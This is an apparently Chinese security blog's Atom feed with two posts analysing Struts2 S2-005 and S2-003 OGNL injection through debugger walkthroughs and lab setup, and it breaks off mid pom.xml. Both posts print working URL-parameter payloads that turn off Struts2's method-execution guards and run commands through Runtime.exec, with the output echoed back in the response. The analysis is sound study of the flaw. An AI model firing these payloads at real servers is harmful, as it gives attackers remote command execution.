<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mengd@</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-01-27T11:00:03.277Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Mengd@</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Struts2-S2 005详细分析</title>
    <link href="http://example.com/2022/01/27/Struts2-S005%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2022/01/27/Struts2-S005%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/</id>
    <published>2022-01-27T06:08:33.000Z</published>
    <updated>2022-01-27T11:00:03.277Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h1><p><strong>注:如果你跟我一样是个菜鸡并且没有看过S2-003,那么强烈建议去看一下S2-003的调用过程,我也有写,可以先看一下</strong></p><p>昨天刚啃完了struts2-s003,第一次分析觉得超级复杂花费了大量的时间,同时也对整个解析流程熟悉了很多,听说S2-005是S2-003的绕过,不妨趁热打铁,直接分析一下.</p><p><strong>注:以下内容以及思维逻辑站在一个刚开始接触java审计的菜鸡身上,同时也能记录我的思维进步过程</strong></p><p>由于熟悉S2-003的调用过程,当我首次看网上各类文章的时候,分为两种</p><p>第一种:简单介绍一下这个是s2-003的绕过,然后提了一下unicode编码绕过,然后就说官方是通过增加一个沙盒模式进行修复,然后就是下载现成环境打一发payload结束</p><p>第二种:一些大佬们直接从代码层面分析代码的改动,首先新增了几个接口,由xxx实现,解释了一大波新的内容,新增了xxxx方法,这对于我这种开发经验不足且刚接触java审计的菜鸡无疑是毁灭性的打击,<strong>但是,既然是针对S2-003的绕过,那我就饶过这个本质而言,先尝试自己分析为什么旧的payload不能执行了</strong>分析完后没想到并没有这么复杂并且我自己在没有看别人发的payload的情况下也完成了绕过,虽说和原本S2-003的payload差距不大,但是这种分析问题的思路给了我很大的启发.</p><h1 id="0X01-旧的payload为什么不能执行了"><a href="#0X01-旧的payload为什么不能执行了" class="headerlink" title="0X01:旧的payload为什么不能执行了?"></a>0X01:旧的payload为什么不能执行了?</h1><p>修改一下pom.xml,将struts2的版本修改到2.1.8.1</p><p>和S2-003一样的分析步骤,完全相同的调用栈,但是其中多了一些步骤,这些步骤是在调用ognlUtil.setValue之前的,我们暂时不管他干了啥,直接来到触发点ognlUtil.setValue<img src="/2022/01/27/Struts2-S005%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220127150715728.png" class title="image-20220127150715728"></p><p>可以看到此处已经经过了各种拦截器但此时expr仍然是我们可控的**,也就是说,S2-005的更新并没有从参数限制上下手,没有直接屏蔽这些unicode编码的特殊字符**</p><p>继续往下跟进</p><img src="/2022/01/27/Struts2-S005%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220127150921638.png" class title="image-20220127150921638"><p>来到熟悉的setValueBody,此时children[0]已经被解析为正常的ognl表达式,<strong>说明仍然会将unicode编码进行解码</strong></p><p>继续往下跟进来到执行第一个参数的地方</p><img src="/2022/01/27/Struts2-S005%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220127151207567.png" class title="image-20220127151207567"><p>可以看到,children已经被顺利执行了,此时图中所示的context已经被修改为了false,<strong>到这里我们就能确定,我们还是可以通过S2-003的payload对context进行修改</strong></p><p>接下来我们来解析第二个参数,也就是静态方法执行</p><img src="/2022/01/27/Struts2-S005%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220127151454612.png" class title="image-20220127151454612"><p>按照之前的逻辑,此时children[0]的children[0]也就是@java.lang.Runtime@getRuntime().exec(‘calc’)是即将被执行的对象</p><img src="/2022/01/27/Struts2-S005%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220127151605169.png" class title="image-20220127151605169"><p>从此往后一路跟踪到了关键的执行静态方法的代码部分,位于ASTStaticMethod.class</p><p>这部分过程和s2-s003几乎一样</p><img src="/2022/01/27/Struts2-S005%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220127151741866.png" class title="image-20220127151741866"><p>如果是S2-003,到这里执行OgnlRuntime.callStaticMethod就会直接弹出计算器了,可是在S2-S005中会直接抛出异常,why?导致抛出异常的原因就是我们payload失效的原因,我们进一步跟进分析</p><p>往下调用,调用栈为</p><p>OgnlRuntime.callStaticMethod-&gt;OgnlRuntime.callStaticMethod(ma.callStaticMethod)-&gt;XWorkMethodAccessor.callStaticMethod.callStaticMethodWithDebugInfo-&gt;ObjectMethodAccessor.callStaticMethod-&gt;ObjectMethodAccessor.OgnlRuntime.callAppropriateMethod-&gt;OgnlRuntime.callAppropriateMethod()</p><p>经过上图调用栈我们来到了OgnlRuntime.callAppropriateMethod()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">callAppropriateMethod</span><span class="params">(OgnlContext context, Object source, Object target, String methodName, String propertyName, List methods, Object[] args)</span> <span class="keyword">throws</span> MethodFailedException </span>&#123;</span><br><span class="line">    Throwable reason = <span class="keyword">null</span>;</span><br><span class="line">    Object[] actualArgs = _objectArrayPool.create(args.length);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Method method = getAppropriateMethod(context, source, target, propertyName, methods, args, actualArgs);</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">if</span> (method == <span class="keyword">null</span> || !isMethodAccessible(context, source, method, propertyName)) &#123;</span><br><span class="line">            StringBuffer buffer = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">            String className = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (target != <span class="keyword">null</span>) &#123;</span><br><span class="line">                className = target.getClass().getName() + <span class="string">&quot;.&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> ilast = args.length - <span class="number">1</span>; i &lt;= ilast; ++i) &#123;</span><br><span class="line">                Object arg = args[i];</span><br><span class="line">                buffer.append(arg == <span class="keyword">null</span> ? NULL_STRING : arg.getClass().getName());</span><br><span class="line">                <span class="keyword">if</span> (i &lt; ilast) &#123;</span><br><span class="line">                    buffer.append(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchMethodException(className + methodName + <span class="string">&quot;(&quot;</span> + buffer + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Object[] convertedArgs = actualArgs;</span><br><span class="line">        <span class="keyword">if</span> (isJdk15() &amp;&amp; method.isVarArgs()) &#123;</span><br><span class="line">            Class[] parmTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; parmTypes.length; ++i) &#123;</span><br><span class="line">                <span class="keyword">if</span> (parmTypes[i].isArray()) &#123;</span><br><span class="line">                    convertedArgs = <span class="keyword">new</span> Object[i + <span class="number">1</span>];</span><br><span class="line">                    System.arraycopy(actualArgs, <span class="number">0</span>, convertedArgs, <span class="number">0</span>, convertedArgs.length);</span><br><span class="line">                    Object[] varArgs;</span><br><span class="line">                    <span class="keyword">if</span> (actualArgs.length &lt;= i) &#123;</span><br><span class="line">                        varArgs = <span class="keyword">new</span> Object[<span class="number">0</span>];</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        ArrayList varArgsList = <span class="keyword">new</span> ArrayList();</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> j = i; j &lt; actualArgs.length; ++j) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (actualArgs[j] != <span class="keyword">null</span>) &#123;</span><br><span class="line">                                varArgsList.add(actualArgs[j]);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        varArgs = varArgsList.toArray();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    convertedArgs[i] = varArgs;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Object var26 = invokeMethod(target, method, convertedArgs);</span><br><span class="line">        <span class="keyword">return</span> var26;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException var21) &#123;</span><br><span class="line">        reason = var21;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException var22) &#123;</span><br><span class="line">        reason = var22;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException var23) &#123;</span><br><span class="line">        reason = var23.getTargetException();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        _objectArrayPool.recycle(actualArgs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> MethodFailedException(source, methodName, (Throwable)reason);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不难发现这里面由两个if判断,在这两个if判断之后就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object var26 &#x3D; invokeMethod(target, method, convertedArgs);</span><br></pre></td></tr></table></figure><p>正是这一行代码最终调用了我们的静态方法,前面说了,我们无法执行静态方法的原因是因为会抛出异常,那么在这段代码里面是在那个地方抛出了异常呢?我们回到debug模式上</p><img src="/2022/01/27/Struts2-S005%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220127152905933.png" class title="image-20220127152905933"><p>在第进入第一个if后会来到一个for循环,此处定义了一个ilast,它等于args的长度-1,而此时args的长度是0,也就是说这里的ilast等于-1,i在上面已经等于0了,也就是说永远不可能满足0&lt;=-1这样的条件,到这里直接就抛出异常,终止调用.</p><p>如何让这个地方不报错呢?我想到最直接的办法就是有没有办法能不经过这个if判断,让第一个if判断为false直接绕过呢?接下来我把重点放在了if判断的条件里面</p><p>if判断的条件是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">method &#x3D;&#x3D; null || !isMethodAccessible(context, source, method, propertyName)</span><br></pre></td></tr></table></figure><p>想让if不执行,那我们就需要</p><p>1.让method不等于null或者isMethodAccessible(context, source, method, propertyName)返回true,而此时method本来就不等于null,所以我们需要想办法让isMethodAccessible(context, source, method, propertyName)返回true</p><p>跟进isMethodAccessible()</p><img src="/2022/01/27/Struts2-S005%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220127153805630.png" class title="image-20220127153805630"><p>可以看到此时我们需要让context.getMemberAccess().isAccessible(context, target, method, propertyName)返回true</p><p>继续跟进context.getMemberAccess()</p><p>可以看到返回了一个_memberAccess,从debug下面来看与S2-003是由很大不同的,可以看到我们现在多了一个SecurityMemberAccess对象(_memberAccess),可以看到这个是属于OgnlContext的,也就是说他也是和context同级别,并且_memberAccess不是hashmap,里面的值都是成员变量与变量值的关系而不是键值对的关系,也就是说我们现在可以通过#_memberAccess.xxx=xxx的形式来修改这里面的成员变量的值<img src="/2022/01/27/Struts2-S005%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220127153927604.png" class title="image-20220127153927604"></p><p>得到了SecurityMemberAccess对象后接着调用它的isAccessible方法</p><p>跟进</p><img src="/2022/01/27/Struts2-S005%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220127155038151.png" class title="image-20220127155038151"><p>可以看到allow初始值为true,如果在第一个大的if里面变为了false,那么就会在第二个大的if直接被return false</p><p>而我们需要他返回true,看到第一个大if里面的第一个子if,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (member instanceof Method &amp;&amp; !getAllowStaticMethodAccess()) </span><br></pre></td></tr></table></figure><p>如果这个if不被执行那我们就可以直接得到一个值为true的(allow,member instanceof Method) 已经为true了现在只需要让!getAllowStaticMethodAccess()为false也就是让getAllowStaticMethodAccess()为true</p><p>跟进getAllowStaticMethodAccess()</p><img src="/2022/01/27/Struts2-S005%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220127155416334.png" class title="image-20220127155416334"><p>可以看到他获取了SecurityMemberAccess中的alloStaticMethodAccess作为返回值,这里是我们可控的,我们可以执行ognl表达式将这里改成true,现在我手动在debug模式下将它改为true,然后观察执行过程</p><p>修改完毕后直接跳过三个if来到了最后一行<img src="/2022/01/27/Struts2-S005%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220127155850764.png" class title="image-20220127155850764"></p><p>跟进</p><img src="/2022/01/27/Struts2-S005%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220127155925171.png" class title="image-20220127155925171"><p>此时满足条件,直接返回true</p><p>现在我们回到刚刚的地方</p><img src="/2022/01/27/Struts2-S005%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220127160014140.png" class title="image-20220127160014140"><p>此时723行处的if语句已经被我们绕过了,下面的if (isJdk15() &amp;&amp; method.isVarArgs())也没有执行,直接跳过,直接就来到了</p><img src="/2022/01/27/Struts2-S005%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220127160145191.png" class title="image-20220127160145191"><p>至此第一个静态方法已经调用成功,接下来通过同样的调用栈第二个静态方法触发计算器即可</p><p>通过以上分析可以发现主要是因为SecurityMemberAccess对象中的alloStaticMethodAccess为false导致整个调用方法的时候会抛出异常,因此只需要在S2-003payload的基础上修改SecurityMemberAccess中的alloStaticMethodAccess为true即可,并不像网上的那么复杂.</p><p>poc:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#39;\u0023context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]\u003dfalse&#39;)(mengda)(mengda)&amp;(&#39;\u0023_memberAccess.allowStaticMethodAccess\u003dtrue&#39;)(mengda)(mengda)&amp;(@java.lang.Runtime@getRuntime().exec(&#39;calc&#39;))(mengda)(mengda)</span><br></pre></td></tr></table></figure><p>回显:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#39;\u0023context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]\u003dfalse&#39;)(mengda)(mengda)&amp;(&#39;\u0023_memberAccess.allowStaticMethodAccess\u003dtrue&#39;)(mengda)(mengda)&amp;(&#39;\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET&#39;)(kxlzx)(kxlzx)&amp;(&#39;\u0023mycmd\u003d\&#39;ipconfig\&#39;&#39;)(bla)(bla)&amp;(&#39;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)&#39;)(bla)(bla)&amp;(A)((&#39;\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())&#39;)(bla))&amp;(B)((&#39;\u0023myres\u003dnew\40byte[51020]&#39;)(bla))&amp;(C)((&#39;\u0023mydat.readFully(\u0023myres)&#39;)(bla))&amp;(D)((&#39;\u0023mystr\u003dnew\40java.lang.String(\u0023myres)&#39;)(bla))&amp;(&#39;\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()&#39;)(bla)(bla)&amp;(E)((&#39;\u0023myout.getWriter().println(\u0023mystr)&#39;)(bla))</span><br></pre></td></tr></table></figure><p>有的时候用旧的payload进行调试找到导致旧payload失效的原因再根据原因想办法解决是一种不错的思路,可能比正着看代码要方便不少.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言:&quot;&gt;&lt;/a&gt;前言:&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;注:如果你跟我一样是个菜鸡并且没有看过S2-003,那么强烈建议去看一下S2-003的调用过程,我也有写,可以先看一下&lt;</summary>
      
    
    
    
    
    <category term="-Java代码审计 -Struts2" scheme="http://example.com/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Struts2/"/>
    
  </entry>
  
  <entry>
    <title>Struts2-S2 003详细分析</title>
    <link href="http://example.com/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/</id>
    <published>2022-01-26T03:10:30.000Z</published>
    <updated>2022-01-27T10:59:49.041Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h1><p>S2-003是第我审计的第二个java漏洞,其中核心还是围绕着OGNL表达式注入的利用,在我的”Struts2-S001”中以一种初学者的理解讲解了ognl表达式的用法,如果说S2-001的作用是让我大概了解了Struts2的执行流程,那么这次的S2-003让我深入了解了ognl的执行原理,网上对于S2-003的解释十分有限,内容不相同的文章就没有几篇,其中有一些我认为很复杂的概念没有讲出来,导致整个利用原理让人摸不着头脑,为什么payload形如(one)(two)?这些括号的意义是什么?为什么ognl就会解析one,而不会解析two呢,为什么(one)(two)(three)甚至是(one)(two)(three)(four)…也是可以成功执行的呢?这涉及以下几个核心概念,本篇文章会在恰当的地方进行解释.</p><p>1.什么是ASTchain,他长什么样?</p><p>2.ognl是如何解析各种类型的AST的</p><p>3.payload被解析为ASTchain后是什么一个形式</p><p>4.payload的解析顺序</p><h1 id="0X01-利用过程-amp-环境搭建"><a href="#0X01-利用过程-amp-环境搭建" class="headerlink" title="0X01:利用过程&amp;环境搭建"></a>0X01:利用过程&amp;环境搭建</h1><p>先写利用过程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;Struts2-s003&#x2F;login.action?(&#39;\u0023context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]\u003dfalse&#39;)(mengda)(mengda)&amp;(@java.lang.Runtime@getRuntime().exec(&#39;calc&#39;))(mengda)(mengda) HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8080</span><br></pre></td></tr></table></figure><p>POC:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#39;\u0023context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]\u003dfalse&#39;)(mengda)(mengda)&amp;(@java.lang.Runtime@getRuntime().exec(&#39;calc&#39;))(mengda)(mengda)</span><br></pre></td></tr></table></figure><p>EXP:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#39;\u0023context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]\u003dfalse&#39;)(bla)(bla)&amp;(&#39;\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET&#39;)(kxlzx)(kxlzx)&amp;(&#39;\u0023mycmd\u003d\&#39;ipconfig\&#39;&#39;)(bla)(bla)&amp;(&#39;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)&#39;)(bla)(bla)&amp;(A)((&#39;\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())&#39;)(bla))&amp;(B)((&#39;\u0023myres\u003dnew\40byte[51020]&#39;)(bla))&amp;(C)((&#39;\u0023mydat.readFully(\u0023myres)&#39;)(bla))&amp;(D)((&#39;\u0023mystr\u003dnew\40java.lang.String(\u0023myres)&#39;)(bla))&amp;(&#39;\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()&#39;)(bla)(bla)&amp;(E)((&#39;\u0023myout.getWriter().println(\u0023mystr)&#39;)(bla))</span><br></pre></td></tr></table></figure><p>通过poc已经注意到了poc形如(one)(two)(three)形式,并且带有unicode编码,后面会详细分析</p><h6 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h6><p>很多文章都没有写如何搭建环境,都是下载现成的,我觉得自己搭建环境对理解整个漏洞逻辑是非常有必要的,所以简单讲解了一下所需环境和所需配置文件,同样的使用idea的maven一键搭建即可</p><p>我们需要一个action,具体如何创建action百度”Struts2 action”,Struts2就好比j2ee的servlet,创建action是因为我们需要调用Struts2的doIntercept方法处理传参,而测试漏洞我们需要一个传参对象(login.action),这里我们创建一个login.action</p><p>虽然叫login.action但是并没有任何功能,源码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">loginaction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">loginaction</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;abd&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>structs.xml如下:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">struts</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://struts.apache.org/dtds/struts-2.0.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;s2-003&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;login&quot;</span> <span class="attr">class</span>=<span class="string">&quot;demo.action.loginaction&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure><p>pom.xml如下:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>Struts2-s003<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Struts2-s003<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Struts 2 Starter<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">struts2.version</span>&gt;</span>2.0.11.1<span class="tag">&lt;/<span class="name">struts2.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">log4j2.version</span>&gt;</span>2.12.1<span class="tag">&lt;/<span class="name">log4j2.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span 